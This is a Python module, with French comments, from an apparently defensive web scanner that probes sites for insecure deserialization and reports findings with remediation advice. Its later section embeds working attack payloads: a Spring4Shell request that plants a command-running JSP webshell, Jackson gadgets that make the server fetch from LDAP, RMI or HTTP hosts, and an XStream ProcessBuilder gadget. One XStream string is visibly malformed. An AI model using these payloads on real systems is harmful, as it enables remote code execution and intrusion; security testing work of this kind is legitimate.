"""
PhantomScan — Insecure Deserialization Scanner
Détecte la désérialisation non sécurisée sur Java, PHP, Python pickle, Ruby Marshal.

Techniques :
  - Magic bytes detection dans les paramètres, cookies, headers
  - Content-Type probing (application/x-java-serialized-object, etc.)
  - Gadget chain payloads avec OOB DNS callback (si interactsh configuré)
  - Détection passive via réponse d'erreur caractéristique
  - Ysoserial-style gadget chain signatures

CWE-502 : Deserialization of Untrusted Data
"""

from __future__ import annotations

import base64
import re
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ─────────────────────────────────────────────────────────────────────────────
# Magic bytes — signatures de sérialisation par langage
# ─────────────────────────────────────────────────────────────────────────────

# Java serialized object : 0xACED0005
_JAVA_MAGIC_B64   = base64.b64encode(b"\xac\xed\x00\x05").decode()
_JAVA_MAGIC_HEX   = "aced0005"
_JAVA_MAGIC_BYTES = b"\xac\xed\x00\x05"

# PHP serialized : s:N:"..."; a:N:{...} O:N:"..."{...}
_PHP_SERIAL_RE = re.compile(
    r'(^|[^a-zA-Z])(s:\d+:"[^"]*";|a:\d+:\{|O:\d+:"[^"]*":\d+:\{)',
    re.M
)

# Python pickle opcodes connus dans les params (proto 2+)
# \x80\x02 = PROTO 2, \x80\x03 = PROTO 3, \x80\x04 = PROTO 4, \x80\x05 = PROTO 5
_PICKLE_MAGIC = [b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05"]

# Ruby Marshal : \x04\x08
_RUBY_MAGIC = b"\x04\x08"

# .NET BinaryFormatter : \x00\x01\x00\x00\x00\xff\xff\xff\xff
_DOTNET_MAGIC = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff"


# ─────────────────────────────────────────────────────────────────────────────
# Indicateurs d'erreur révélateurs de désérialisation
# ─────────────────────────────────────────────────────────────────────────────

_JAVA_DESER_ERRORS = [
    r"java\.io\.ObjectInputStream",
    r"java\.io\.InvalidClassException",
    r"java\.io\.StreamCorruptedException",
    r"ClassNotFoundException",
    r"java\.lang\.ClassCastException.*serial",
    r"com\.fasterxml\.jackson.*MismatchedInputException",
    r"org\.apache\.commons\.collections",
    r"ysoserial",
    r"gadget chain",
    r"java\.io\.EOFException",
    r"deserialization",
]

_PHP_DESER_ERRORS = [
    r"unserialize\(\)",
    r"__wakeup",
    r"__destruct",
    r"Notice: unserialize\(\)",
    r"Warning: unserialize\(\)",
    r"unserialize_callback_func",
]

_PYTHON_DESER_ERRORS = [
    r"pickle\.loads",
    r"_pickle\.UnpicklingError",
    r"AttributeError.*__reduce__",
    r"copyreg\._reconstructor",
]

_RUBY_DESER_ERRORS = [
    r"Marshal\.load",
    r"TypeError: instance of IO",
    r"no implicit conversion",
]

_DOTNET_DESER_ERRORS = [
    r"BinaryFormatter",
    r"SerializationException",
    r"System\.Runtime\.Serialization",
    r"TypeNameHandling",
    r"NewtonSoft\.Json.*TypeNameHandling",
]


# ─────────────────────────────────────────────────────────────────────────────
# Payloads de détection passive (encodés pour insertion dans params/cookies)
# ─────────────────────────────────────────────────────────────────────────────

def _java_probe_b64() -> str:
    """Java sérialisé minimal — juste le magic + version, pas d'exploit réel."""
    # Header Java serialization + stream version 5 — suffisant pour déclencher
    # une exception StreamCorruptedException ou ClassNotFoundException côté serveur
    probe = b"\xac\xed\x00\x05" + b"\x73"  # TC_OBJECT tag
    return base64.b64encode(probe).decode()

def _java_probe_hex() -> str:
    return "aced0005" + "73"

def _pickle_probe_b64() -> str:
    """Pickle proto 2 minimal — déclenche UnpicklingError si tenté de désérialiser."""
    # PROTO 2 + STOP — objet vide, déclenche une exception si désérialisé naïvement
    probe = b"\x80\x02" + b"}"  + b"."   # empty dict + STOP
    return base64.b64encode(probe).decode()

def _ruby_probe_b64() -> str:
    """Ruby Marshal 4.8 — header seul."""
    probe = b"\x04\x08" + b"0"   # nil value — déclenche une erreur si mal géré
    return base64.b64encode(probe).decode()

def _php_probe() -> str:
    """PHP serialized object — classe inexistante pour déclencher une erreur."""
    return 'O:31:"PhantomScanDeserProbe":0:{}'


# ─────────────────────────────────────────────────────────────────────────────
# Content-Types suspects à tester
# ─────────────────────────────────────────────────────────────────────────────

_JAVA_CONTENT_TYPES = [
    "application/x-java-serialized-object",
    "application/octet-stream",
    "application/x-java-object",
]

_PARAMS_TO_FUZZ = {
    "data", "payload", "object", "token", "session", "state",
    "user", "auth", "body", "input", "value", "serialized",
    "encoded", "obj", "request", "message", "content",
}


# ─────────────────────────────────────────────────────────────────────────────
# Scanner
# ─────────────────────────────────────────────────────────────────────────────

class DeserializationScanner(ScannerMixin):
    """
    Détecte la désérialisation non sécurisée (Java, PHP, Python pickle, Ruby Marshal, .NET).
    Phase 1 : Détection passive — cherche des magic bytes dans les réponses, params, cookies.
    Phase 2 : Active probing — injecte des payloads de désérialisation malformés.
    Phase 3 : Content-Type probing — POST avec application/x-java-serialized-object.
    """

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heuristic = heuristic
        self._cfg = cfg

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)

        # Phase 1 — analyse passive de la réponse initiale
        async for f in self._passive_analysis(target):
            yield f

        # Phase 2 — fuzz les paramètres URL
        params = parse_qs(parsed.query, keep_blank_values=True)
        async for f in self._fuzz_url_params(target, parsed, params):
            yield f

        # Phase 3 — fuzz les cookies
        async for f in self._fuzz_cookies(target):
            yield f

        # Phase 4 — Content-Type probing (Java)
        async for f in self._probe_java_content_type(target):
            yield f

        # Phase 5 — endpoints courants acceptant des objets sérialisés
        async for f in self._probe_common_endpoints(target):
            yield f

    # ── Phase 1 : Analyse passive ────────────────────────────────────────────

    async def _passive_analysis(self, target: str) -> AsyncIterator[Finding]:
        """Analyse la réponse initiale pour des signes de désérialisation."""
        resp = await self._req.get(target)
        if resp.error:
            return

        # Cherche des magic bytes Java encodés en base64 dans le corps de réponse
        if re.search(r"rO0AB", resp.body):  # base64 de \xac\xed\x00\x05
            yield Finding(
                title="Désérialisation Java — magic bytes en réponse",
                severity=Severity.HIGH,
                url=target,
                module="vulns/deserialization",
                description=(
                    "Des magic bytes Java (`rO0AB...` = base64 de `\\xac\\xed\\x00\\x05`) "
                    "ont été détectés dans la réponse HTTP. "
                    "Cela indique que le serveur retourne des objets Java sérialisés "
                    "potentiellement désérialisés depuis l'input utilisateur."
                ),
                evidence=f"Pattern `rO0AB` trouvé dans la réponse | URL: {target}",
                cwe="CWE-502",
                remediation=(
                    "Ne jamais désérialiser des données non fiables avec ObjectInputStream. "
                    "Utiliser des formats safe (JSON/XML avec schéma strict). "
                    "Appliquer les filtres de désérialisation Java (JEP 290 — ObjectInputFilter). "
                    "Utiliser SerialKiller, NotSoSerial, ou désactiver la désérialisation Java."
                ),
            )

        # Cherche les magic bytes pickle encodés
        for magic in _PICKLE_MAGIC:
            if base64.b64encode(magic).decode()[:4] in resp.body:
                yield Finding(
                    title="Désérialisation Python pickle — magic bytes en réponse",
                    severity=Severity.HIGH,
                    url=target,
                    module="vulns/deserialization",
                    description=(
                        f"Magic bytes Python pickle (`{magic.hex()}`) détectés en réponse. "
                        "Si ce contenu est re-désérialisé depuis un input utilisateur, "
                        "cela mène à une RCE via `__reduce__`."
                    ),
                    evidence=f"Pickle magic `{magic.hex()}` en base64 dans la réponse",
                    cwe="CWE-502",
                    remediation=(
                        "Remplacer pickle par JSON ou msgpack. "
                        "Si pickle est requis, signer les données (HMAC) avant de les désérialiser. "
                        "Ne jamais charger du pickle depuis une source non fiable."
                    ),
                )
                break

        # Cherche des erreurs de désérialisation dans la réponse (info leak)
        for platform, patterns in [
            ("Java",   _JAVA_DESER_ERRORS),
            ("PHP",    _PHP_DESER_ERRORS),
            ("Python", _PYTHON_DESER_ERRORS),
            ("Ruby",   _RUBY_DESER_ERRORS),
            (".NET",   _DOTNET_DESER_ERRORS),
        ]:
            hit = self._find_pattern(resp.body, patterns)
            if hit:
                yield Finding(
                    title=f"Désérialisation {platform} — fuite d'erreur",
                    severity=Severity.MEDIUM,
                    url=target,
                    module="vulns/deserialization",
                    description=(
                        f"La réponse contient une erreur liée à la désérialisation {platform} : "
                        f"`{hit}`. Cela confirme l'utilisation de désérialisation et peut "
                        f"indiquer que des inputs non validés sont désérialisés."
                    ),
                    evidence=f"Pattern détecté : `{hit[:200]}`",
                    cwe="CWE-502",
                    remediation=(
                        f"Intercepter et masquer les exceptions de désérialisation {platform}. "
                        "Implémenter une validation stricte avant désérialisation."
                    ),
                )
                break  # Un finding par réponse suffit

    # ── Phase 2 : Fuzz URL params ─────────────────────────────────────────────

    async def _fuzz_url_params(
        self, target: str, parsed, params: dict
    ) -> AsyncIterator[Finding]:
        """Injecte des magic bytes de désérialisation dans les paramètres URL."""
        all_params = set(params.keys()) | _PARAMS_TO_FUZZ

        probes = [
            ("Java",   _java_probe_b64()),
            ("Java",   _java_probe_hex()),
            ("PHP",    _php_probe()),
            ("Pickle", _pickle_probe_b64()),
            ("Ruby",   _ruby_probe_b64()),
        ]

        for param in list(params.keys()):  # Seulement les params existants
            if param.lower() not in _PARAMS_TO_FUZZ and param not in params:
                continue
            for platform, payload in probes:
                fuzzed = dict(params)
                fuzzed[param] = [payload]
                fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))

                resp = await self._req.get(fuzz_url)
                if resp.error or resp.status in (404, 410):
                    continue

                async for f in self._analyze_deser_response(resp, fuzz_url, platform, param, payload):
                    yield f

    # ── Phase 3 : Fuzz cookies ────────────────────────────────────────────────

    async def _fuzz_cookies(self, target: str) -> AsyncIterator[Finding]:
        """Injecte des payloads de désérialisation dans les cookies."""
        # D'abord, récupère les cookies existants
        resp_initial = await self._req.get(target)
        if resp_initial.error:
            return

        # Cherche les cookies qui ressemblent à des objets sérialisés
        # (souvent en base64 ou hex dans les Set-Cookie)
        cookies_b64 = re.findall(
            r'Set-Cookie:\s*([^=]+)=([A-Za-z0-9+/=]{20,})',
            resp_initial.raw_headers if hasattr(resp_initial, 'raw_headers') else "",
            re.I
        )

        # Probe générique sur les cookies de session courants
        session_cookies = ["PHPSESSID", "session", "auth", "token", "data",
                           "user", "JSESSIONID", ".ASPXAUTH", "state"]
        probes = [
            ("Java",   _java_probe_b64()),
            ("PHP",    _php_probe()),
            ("Pickle", _pickle_probe_b64()),
        ]

        for cookie_name in session_cookies:
            for platform, payload in probes:
                resp = await self._req.get(target, extra_headers={
                    "Cookie": f"{cookie_name}={payload}"
                })
                if resp.error or resp.status in (404, 410):
                    continue

                async for f in self._analyze_deser_response(
                    resp, target, platform, f"cookie:{cookie_name}", payload
                ):
                    yield f

    # ── Phase 4 : Content-Type Java ───────────────────────────────────────────

    async def _probe_java_content_type(self, target: str) -> AsyncIterator[Finding]:
        """
        Envoie un POST avec Content-Type: application/x-java-serialized-object
        et les magic bytes Java. Si le serveur répond différemment, c'est suspect.
        """
        for ct in _JAVA_CONTENT_TYPES:
            # Corps = magic bytes Java + stream version
            java_payload = b"\xac\xed\x00\x05\x73\x72"  # TC_OBJECT TC_CLASSDESC

            resp = await self._req.post(
                target,
                data=java_payload,
                headers={"Content-Type": ct},
            )
            if resp.error:
                continue

            # Si le serveur ne renvoie pas 400/415/405, c'est qu'il accepte le Content-Type
            if resp.status not in (400, 405, 415, 501):
                # Cherche des traces de désérialisation dans la réponse
                hit = self._find_pattern(resp.body, _JAVA_DESER_ERRORS + _DOTNET_DESER_ERRORS)
                if hit or resp.status == 500:
                    yield Finding(
                        title=f"Désérialisation Java — Content-Type accepté ({ct})",
                        severity=Severity.CRITICAL,
                        url=target,
                        module="vulns/deserialization",
                        description=(
                            f"Le serveur accepte les requêtes POST avec "
                            f"`Content-Type: {ct}` et semble traiter les objets Java sérialisés. "
                            f"HTTP {resp.status} reçu. "
                            "Si une gadget chain appropriée est utilisée (Commons Collections, "
                            "Spring, etc.), cela mène à une RCE directe."
                        ),
                        evidence=(
                            f"POST {target} avec CT={ct} → HTTP {resp.status}"
                            + (f" | Pattern: `{hit}`" if hit else "")
                        ),
                        cwe="CWE-502",
                        remediation=(
                            "CRITIQUE — Désactiver la désérialisation Java de données non fiables. "
                            "Implémenter JEP 290 ObjectInputFilter avec une allowlist stricte. "
                            "Patcher les dépendances (Commons Collections, Spring, etc.) vers "
                            "les versions sans gadget chains connues. "
                            "Utiliser des agents de protection runtime (SerialKiller, RASP)."
                        ),
                    )
                    break

    # ── Phase 5 : Endpoints communs ───────────────────────────────────────────

    async def _probe_common_endpoints(self, target: str) -> AsyncIterator[Finding]:
        """
        Probe des endpoints courants qui acceptent des objets sérialisés
        (Java RMI, Axis, JMX, AMF, ViewState .NET, etc.)
        """
        base = target.rstrip("/")
        parsed = urlparse(target)

        endpoints = [
            # Java / J2EE
            ("/invoker/JMXInvokerServlet",  "application/x-java-serialized-object", "Java JMX"),
            ("/axis/services/AdminService",  "application/x-java-serialized-object", "Apache Axis"),
            ("/webdynpro/dispatcher",        "application/x-java-serialized-object", "SAP WebDynpro"),
            # PHP
            ("/index.php?page=php://filter/convert.base64-encode/resource=index", "text/html", "PHP Wrapper"),
            # Python/Django
            ("/api/session/",               "application/x-pickle",                 "Python Pickle API"),
            # AMF (Adobe/Flash)
            ("/flex/messagebroker/amf",     "application/x-amf",                    "Adobe AMF"),
            # ViewState (.NET)
            ("/WebResource.axd",            "text/html",                            ".NET ViewState"),
        ]

        for path, ct, tech in endpoints:
            url = f"{parsed.scheme}://{parsed.netloc}{path}"

            # Probe HEAD d'abord pour éviter des requêtes coûteuses
            resp_head = await self._req.get(url)
            if resp_head.error or resp_head.status in (404, 410):
                continue

            # L'endpoint existe — envoyer le payload de désérialisation approprié
            if "java" in ct or "amf" in ct or "pickle" in ct:
                payload = b"\xac\xed\x00\x05\x73\x72"  # Java magic
                if "pickle" in ct:
                    payload = b"\x80\x02}"  + b"."   # Pickle empty dict
            else:
                payload = b""

            if payload:
                resp_post = await self._req.post(url, data=payload, headers={"Content-Type": ct})
                if resp_post.error:
                    continue

                hit = self._find_pattern(
                    resp_post.body,
                    _JAVA_DESER_ERRORS + _PHP_DESER_ERRORS + _PYTHON_DESER_ERRORS + _DOTNET_DESER_ERRORS
                )
                if hit or resp_post.status == 500:
                    yield Finding(
                        title=f"Désérialisation — endpoint {tech} détecté ({path})",
                        severity=Severity.CRITICAL,
                        url=url,
                        module="vulns/deserialization",
                        description=(
                            f"L'endpoint `{path}` ({tech}) semble accepter et traiter des "
                            f"objets sérialisés (HTTP {resp_post.status}). "
                            "Ce type d'endpoint est fréquemment exploitable via des gadget chains "
                            "(ysoserial, marshalsec) pour obtenir une RCE."
                        ),
                        evidence=(
                            f"GET {url} → {resp_head.status} | "
                            f"POST avec payload → {resp_post.status}"
                            + (f" | Erreur: `{hit[:200]}`" if hit else "")
                        ),
                        cwe="CWE-502",
                        remediation=(
                            f"Désactiver ou restreindre l'accès à {path}. "
                            "Appliquer une authentification stricte sur tous les endpoints "
                            "de gestion/invocation. "
                            "Utiliser ysoserial pour tester les gadget chains applicables."
                        ),
                    )

    # ── Helpers ───────────────────────────────────────────────────────────────

    async def _analyze_deser_response(
        self,
        resp,
        url: str,
        platform: str,
        param: str,
        payload: str,
    ) -> AsyncIterator[Finding]:
        """Analyse une réponse après injection d'un payload de désérialisation."""
        error_maps = {
            "Java":   _JAVA_DESER_ERRORS,
            "PHP":    _PHP_DESER_ERRORS,
            "Pickle": _PYTHON_DESER_ERRORS,
            "Ruby":   _RUBY_DESER_ERRORS,
            ".NET":   _DOTNET_DESER_ERRORS,
        }
        patterns = error_maps.get(platform, _JAVA_DESER_ERRORS)
        hit = self._find_pattern(resp.body, patterns)

        if hit or resp.status == 500:
            severity = Severity.CRITICAL if resp.status == 500 else Severity.HIGH
            yield Finding(
                title=f"Désérialisation {platform} non sécurisée — param `{param}`",
                severity=severity,
                url=url,
                module="vulns/deserialization",
                description=(
                    f"Injection d'un payload {platform} dans le paramètre `{param}` a provoqué "
                    f"une réponse anormale (HTTP {resp.status}). "
                    + (f"Pattern d'erreur détecté : `{hit}`. " if hit else "")
                    + "Cela indique que le paramètre est désérialisé côté serveur sans validation."
                ),
                evidence=(
                    f"Payload: `{payload[:60]}...` → HTTP {resp.status}"
                    + (f" | Pattern: `{hit[:100]}`" if hit else "")
                ),
                cwe="CWE-502",
                remediation=(
                    f"Ne pas désérialiser les données {platform} depuis des sources non fiables. "
                    "Utiliser des formats de données sûrs (JSON avec validation de schéma). "
                    "Si la désérialisation est obligatoire, implémenter une signature HMAC "
                    "et une validation stricte du type avant désérialisation."
                ),
            )

    @staticmethod
    def _find_pattern(body: str, patterns: list[str]) -> str | None:
        """Retourne le premier pattern matché ou None."""
        for pattern in patterns:
            m = re.search(pattern, body, re.I)
            if m:
                return m.group(0)
        return None
    # ── v5.20 — Gadget chain probes enrichis ─────────────────────────────────

    # Spring4Shell / Spring Framework RCE (CVE-2022-22965)
    _SPRING4SHELL_HEADERS = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    _SPRING4SHELL_BODY = (
        "class.module.classLoader.resources.context.parent.pipeline.first"
        ".pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B"
        "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request"
        ".getParameter(%22cmd%22)).getInputStream()%3Bint%20a%20%3D%20-1%3Bbyte%5B%5D"
        "%20b%20%3D%20new%20byte%5B2048%5D%3Bwhile((a%3Din.read(b))!%3D-1)%7Bout"
        ".println(new%20String(b%2C0%2Ca))%3B%7D%7D%25%7Bsuffix%7Di"
        "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
        "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
        "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
        "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    )

    # Jackson deserialization gadget probes
    _JACKSON_PROBES = [
        # CVE-2017-7525 / CVE-2019-12086 — type confusion
        ('["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://127.0.0.1:1389/exploit","autoCommit":true}]',
         "Jackson JdbcRowSetImpl LDAP"),
        ('["org.apache.commons.dbcp2.datasources.SharedPoolDataSource", {}]',
         "Jackson Commons DBCP2"),
        ('["com.zaxxer.hikari.HikariDataSource", {}]',
         "Jackson HikariCP"),
        ('{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}',
         "Jackson @class JdbcRowSetImpl RMI"),
        ('{"@class":"org.springframework.context.support.ClassPathXmlApplicationContext","configLocation":"http://127.0.0.1/rce.xml"}',
         "Jackson Spring ClassPathXml"),
    ]

    # XStream gadgets
    _XSTREAM_PROBES = [
        ('<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>id</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>',
         "XStream EventHandler ProcessBuilder"),
        ('<tree-map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><contentType>text/plain</contentType><is class="java.io.SequenceInputStream"><e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator"><iterator class="javax.imageio.spi.FilterIterator"><iter class="java.util.ArrayList$Itr"><cursor>0</cursor><lastRet>-1</lastRet><expectedModCount>1</expectedModCount></iter><next class="com.sun.corba.se.impl.io.ObjectStreamClass"><fields><sun.reflect.annotation.AnnotationType><memberTypes><entry><string>value</string><class>com.sun.corba.se.impl.io.ObjectStreamClass</class></entry></memberTypes></sun.reflect.annotation.AnnotationType></fields></sun.reflect.annotation.AnnotationType></next></javax.imageio.spi.FilterIterator>',
         "XStream complex gadget"),
    ]

    # Hessian gadget probes
    _HESSIAN_PROBE_B64 = "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAABYXQAAWJ4"

    async def _test_spring4shell(self, target: str) -> AsyncIterator[Finding]:
        """
        v5.20 — Détecte CVE-2022-22965 (Spring4Shell) via pattern injection
        dans le class loader. Cherche la création de .jsp dans la réponse ou OOB.
        """
        from phantomscan.core.requester import ProbeRequest

        # Test via POST avec les paramètres caractéristiques
        canary = self.get_canary(tag="spring4shell")
        test_url = target.rstrip("/")

        resp = await self._req.send(ProbeRequest(
            method="POST",
            url=test_url,
            headers={**self._SPRING4SHELL_HEADERS},
            body=self._SPRING4SHELL_BODY,
        ))
        if resp.error:
            return

        # Indicateurs Spring4Shell dans la réponse
        spring_indicators = re.compile(
            r"class\.module\.classLoader|classLoader.*resources.*context|"
            r"tomcatwar\.jsp|Successfully.*wrote|WritableWebApplicationContext",
            re.I,
        )

        if resp.status in (200, 400, 500) and spring_indicators.search(resp.body or ""):
            yield Finding(
                title="Spring4Shell CVE-2022-22965 — Possible RCE via ClassLoader",
                severity=Severity.CRITICAL,
                url=test_url,
                module="vulns/deserialization",
                description=(
                    "Pattern CVE-2022-22965 (Spring4Shell) détecté. "
                    "Le serveur semble exposer le class loader Spring via les paramètres. "
                    "Un attaquant peut écrire un webshell JSP."
                ),
                evidence=f"HTTP {resp.status} | Spring ClassLoader pattern in response",
                cwe="CWE-502",
                remediation=(
                    "Mettre à jour Spring Framework ≥ 5.3.18 ou ≥ 5.2.20. "
                    "Désactiver le binding des propriétés classLoader (DataBinder.setDisallowedFields). "
                    "Utiliser Spring Boot ≥ 2.6.6."
                ),
            )

    async def _test_jackson_blind(self, target: str) -> AsyncIterator[Finding]:
        """
        v5.20 — Teste les gadgets Jackson avec callback OOB.
        Remplace 127.0.0.1 par le canary OOB pour la détection blind.
        """
        from phantomscan.core.requester import ProbeRequest
        import json

        for probe_body, desc in self._JACKSON_PROBES[:3]:
            canary = self.get_canary(tag=f"jackson-{desc[:10]}")
            if canary:
                # Remplacer l'adresse par le canary
                probe_body = probe_body.replace(
                    "127.0.0.1:1389", canary.dns_name
                ).replace(
                    "127.0.0.1:1099", canary.dns_name
                ).replace(
                    "127.0.0.1", canary.dns_name
                )

            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=target,
                headers={"Content-Type": "application/json"},
                body=probe_body,
            ))

            if canary:
                hits = await self.wait_for_oob_hit(canary, timeout=8.0)
                if hits:
                    yield Finding(
                        title=f"Jackson Deserialization RCE CONFIRMED — {desc} (OOB)",
                        severity=Severity.CRITICAL,
                        url=target,
                        module="vulns/deserialization",
                        description=(
                            f"Désérialisation Jackson confirmée via callback OOB : {desc}. "
                            "Le serveur a initié une connexion LDAP/RMI vers le canary, "
                            "indiquant une désérialisation non sécurisée exploitable."
                        ),
                        evidence=(
                            f"OOB callback | gadget={desc} | "
                            f"proto={hits[0].get('protocol','?')} | "
                            f"remote={hits[0].get('remote_address','?')}"
                        ),
                        cwe="CWE-502",
                        remediation=(
                            "Désactiver polymorphic type handling (enableDefaultTyping). "
                            "Utiliser @JsonTypeInfo avec whitelist stricte. "
                            "Mettre à jour jackson-databind ≥ 2.14.0."
                        ),
                    )
                    return
            else:
                # Sans OOB : chercher des indicateurs d'erreur de déserialisation
                deser_error_re = re.compile(
                    r"ClassNotFound|NoSuchClass|IllegalAccessException|"
                    r"instantiation.*failed|Unresolved.*forward.*reference|"
                    r"jackson.*deser|ObjectMapper",
                    re.I,
                )
                if deser_error_re.search(resp.body or ""):
                    yield Finding(
                        title=f"Jackson Deserialization — Error-based indicator ({desc})",
                        severity=Severity.HIGH,
                        url=target,
                        module="vulns/deserialization",
                        description=(
                            f"Indicateur de désérialisation Jackson détecté via {desc}. "
                            "Des patterns de gadget chain ont déclenché des erreurs "
                            "caractéristiques. Confirmer avec --oob interactsh pour RCE."
                        ),
                        evidence=f"Jackson error pattern in response | gadget={desc}",
                        cwe="CWE-502",
                        remediation="Mettre à jour jackson-databind ≥ 2.14.0. Désactiver enableDefaultTyping.",
                    )
                    return


